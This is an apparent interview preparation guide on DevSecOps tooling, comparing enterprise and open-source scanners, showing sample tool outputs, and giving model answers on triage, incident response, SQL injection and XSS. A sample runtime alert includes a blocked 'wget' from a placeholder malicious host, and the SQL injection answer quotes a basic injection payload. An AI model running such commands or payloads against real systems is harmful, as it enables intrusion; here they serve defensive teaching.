## Part 1: High-Level Comparison (The "Cheat Sheet")

Use this table for quick decision-making or to explain trade-offs during an interview.

### 1. Static Application Security Testing (SAST)
*Analyze source code for bugs/vulnerabilities.*

| Feature | **Checkmarx One** (Enterprise) | **SonarQube** (Open Source / Community) |
| :--- | :--- | :--- |
| **Analysis Depth** | **Deep Data Flow.** Traces malicious input from API to DB across multiple files. | **Linting & Quality.** Focuses on code smells, complexity, and basic security flaws. |
| **Language Support** | Extensive (Legacy, Mobile, C++, Apex). | Good for modern web (Java, JS, Python). C/C++ often requires paid tier. |
| **False Positives** | **Low.** Advanced algorithms filter noise. | **Moderate/High.** Often flags safe code as "smelly" or vulnerable. |
| **Fix Advice** | Detailed, contextual remediation (e.g., "Sanitize variable X at line Y"). | Generic advice (e.g., "Use a prepared statement"). |

### 2. Container Security
*Scan images and runtime environments.*

| Feature | **Prisma Cloud (Twistlock)** (Enterprise) | **Trivy** (Open Source) |
| :--- | :--- | :--- |
| **Scope** | **Full Lifecycle:** Build, Registry, **Runtime Defense**, & Cloud Compliance. | **Scanner Only:** Build & Registry scanning (Images, Filesystems). |
| **Runtime Protection** | **Yes.** Blocks active attacks (e.g., stops `cryptominer` process). | **No.** Cannot stop a running container. |
| **Vulnerability DB** | Proprietary (Unit 42). Very fast updates. | Public CVE databases. |

### 3. DAST (Dynamic Analysis)
*Attack the running app.*

| Feature | **Acunetix** (Enterprise) | **OWASP ZAP** (Open Source) |
| :--- | :--- | :--- |
| **Ease of Use** | **Point & Shoot.** Highly automated, handles login/MFA easily. | **Manual Config.** Powerful but requires scripting for auth/complex flows. |
| **Accuracy** | **IAST Support.** Uses an agent to verify bugs, reducing false positives. | Standard DAST. Can have noise without tuning. |
| **Reporting** | Executive PDFs with compliance (PCI, HIPAA). | Technical HTML/XML reports for devs. |

### 4. SCA (Software Composition Analysis)
*Check libraries for CVEs & Licenses.*

| Feature | **Snyk / Black Duck** (Enterprise) | **OWASP Dependency-Check** (Open Source) |
| :--- | :--- | :--- |
| **Remediation** | **Auto-Fix.** Opens Pull Requests to upgrade libraries. | **Report Only.** Manual upgrade required. |
| **Dependency Tree** | Shows exact path to vulnerable transitive dependency. | Basic reporting. |
| **Legal** | Deep license compliance analysis. | Basic license identification. |

## Part 2: Tool Insights & Sample Outputs (The "Deep Dive")

This section helps you understand *what these tools actually look like* when investigating an issue.

### 1. Checkmarx (SAST) - Data Flow Analysis
**Why it matters:** It proves *how* a hacker gets in.
**Sample Output:**
```json
{
  "Vulnerability": "SQL Injection",
  "Severity": "High",
  "Source": "controller/UserController.java:45 (params.get('id'))",
  "DataFlow": [
     "Line 45: input received",
     "Line 50: passed to service layer",
     "Line 12: executed in DB without validation"
  ],
  "Sink": "dao/UserDao.java:12 (executeQuery)"
}
```

### 2. Twistlock (Container Runtime) - Active Defense
**Why it matters:** It stops zero-day attacks that static scanners miss.
**Sample Alert:**
```json
{
  "Event": "Runtime Process Violation",
  "Action": "Blocked",
  "Process": "/bin/sh -c wget http://malicious.site/script.sh",
  "Message": "Process '/bin/sh' is not in the whitelist for image 'kyc-app:production'."
}
```

### 3. Trivy (Container Scanning) - CI/CD Gate
**Why it matters:** It's fast and free, perfect for blocking builds.
**Sample Output:**
```text
Library     Vulnerability   Severity   Fixed Version
-------     -------------   --------   -------------
openssl     CVE-2023-1234   CRITICAL   1.1.1l
express     CVE-2022-5678   HIGH       4.17.3
```

## Part 3: Core DevSecOps Theory

Before answering scenario questions, you must understand the foundational theory.

### 1. The CIA Triad
Every security decision balances these three pillars:
*   **Confidentiality:** Only authorized users can see data (Encryption, IAM).
    *   *Tool:* HashiCorp Vault, AWS KMS.
*   **Integrity:** Data hasn't been tampered with (Signing, Checksums).
    *   *Tool:* Cosign (Image Signing), File Integrity Monitoring (FIM).
*   **Availability:** Data/System is accessible when needed (DDoS Protection, HA).
    *   *Tool:* AWS WAF, Autoscaling.

### 2. The Vulnerability Management Lifecycle
It's not just "Scanning". It's a loop:
1.  **Identify:** Scan (SAST/DAST/SCA).
2.  **Prioritize:** Not all criticals are real. Is the function actually called? Is the port open? (Context).
3.  **Remediate:** Upgrade package, change code, patch OS.
4.  **Verify:** Re-scan to ensure the fix worked and didn't break functionality.

### 3. Shift Left vs. Shield Right
*   **Shift Left (Prevention):** Fix issues in Dev. Cheaper. (SAST, SCA, Pre-commit hooks).
*   **Shield Right (Protection):** Monitor and block attacks in Prod. (WAF, RASP/Runtime Defense).

## Part 4: Comprehensive Interview Questions

### Section A: Technical Scenarios

#### Q1: "How do you handle False Positives?"
*   **The Trap:** Saying "I just ignore them."
*   **The Best Answer:** "We triage them. primarily using **Baseline files** (SonarQube) or **Suppression files** (Trivy/Owasp DC).
    *   **Process:** I work with developers to review the HIGH/CRITICAL findings.
    *   **Action:** If it's a false positive, we mark it as `Won't Fix` or `False Positive` in the dashboard so it doesn't break future builds.
    *   **Enterprise Edge:** 'In Checkmarx, I can mark a path as sanitized globally, which reduces noise significantly compared to OASP ZAP.'"

#### Q2: "What is the difference between SAST and DAST? Which comes first?"
*   **Answer:**
    *   **SAST (Shift Left):** Happens in the **Build/Code** phase. White-box testing. finds code errors. (Tool: SonarQube).
    *   **DAST (Shift Right):** Happens in the **Deploy/Test** phase. Black-box testing. finds runtime errors like config issues or broken auth. (Tool: OWASP ZAP).
    *   **Strategy:** "We run SAST on every commit because it's fast. We run DAST nightly or on 'Release Candidate' builds because it takes longer and needs a running app."

#### Q3: "Why would we pay for Twistlock when Trivy is free?"
*   **Crucial Concept:** **Runtime Security.**
*   **Answer:** "Trivy is great for scanning images *before* they deploy (Static Analysis). But once the container is running in production, Trivy does nothing. **Twistlock** protects us at **Runtime**. If a hacker exploits a Zero-Day vulnerability that Trivy didn't know about, Twistlock can still stop the weird process behavior (e.g., a web server trying to run a port scan). For a banking app like ours (KYC), defense-in-depth is mandatory."

#### Q4: "A developer says 'This vulnerability is in a library we don't even use.' What do you do?"
*   **Answer:** "This is a common scenario with **Transitive Dependencies**.
    1.  **Verify:** I check the dependency tree (`npm list` or Snyk/Maven tree) to confirm if the vulnerable function is actually reachable.
    2.  **Remediate:** Even if unused, it's a risk (someone might use it later). I prefer to **Exclude** the unused transitive dependency or **Upgrade** the parent library.
    3.  **VEX (Vulnerability Exploitability Exchange):** If we must keep it, I document it in a VEX artifact stating 'Not Affecting' so auditors know we reviewed it."

### Section B: Behavioral & Culture

#### Q5: "Developers hate security tools because they slow down the pipeline. How do you fix this?"
*   **Answer:** "Security cannot be a blocker; it must be an enabler.
    1.  **Async/Parallel Scanning:** Run heavy scans (DAST/Full SAST) in a separate nightly pipeline, not the PR build.
    2.  **Incremental Scanning:** Configure SonarQube/Checkmarx to only scan *changed files* (PR analysis) instead of the whole repo.
    3.  **Governance:** Only block builds on **Critical/High** issues that have a fix available. Medium/Low issues should just generate tickets (Jira integration)."

#### Q6: "We just found a Critical CVE in our production logical. Walk me through your Incident Response."
*   **Answer:**
    1.  **Triage/Validate:** specific team confirms it's real.
    2.  **Containment:** If active exploitation is possible, we block the specific path in the **WAF** (Web Application Firewall) or scale down the vulnerable pods.
    3.  **Remediation:** Developers create a hotfix branch.
    4.  **Verification:** We run a targeted Trivy/SAST scan on the hotfix.
    5.  **Deployment:** Fast-track deploy (bypassing extensive regression tests if approved by VP).
    6.  **Post-Mortem:** We analyze *why* the pipeline missed it. Was the signature missing? Do we need a new policy?"

### Section C: Specific Vulnerabilities (Technical QA)

#### Q7: "Explain SQL Injection and how you prevent it?"
*   **Explanation:** "It's when untrusted user input is concatenated directly into a database query, allowing an attacker to manipulate the query (e.g., `' OR '1'='1`)."
*   **Prevention:** "Use **Prepared Statements** (Parameterized Queries). This ensures the DB treats input as data, not executable code. SAST tools like Checkmarx are excellent at finding this."

#### Q8: "What is Cross-Site Scripting (XSS)?"
*   **Explanation:** "Injecting malicious scripts into a trusted website that other users view. (Reflected vs Stored)."
*   **Prevention:** "Output Encoding (escaping special chars) and using modern frameworks like React (which escapes by default). Also, implementing **Content Security Policy (CSP)** headers."

### Additional Tools to Mention (Resume Boosters)
*   **Secret Scanning:** **TruffleHog / GitGuardian**. (Scans git history for AWS keys/Passwords).
*   **IaC Security:** **Checkov / tfsec**. (Scans Terraform files for misconfigurations like open S3 buckets).
*   **K8s Security:** **Kyverno / OPA Gatekeeper**. (Policy engines to prevent deploying root containers).
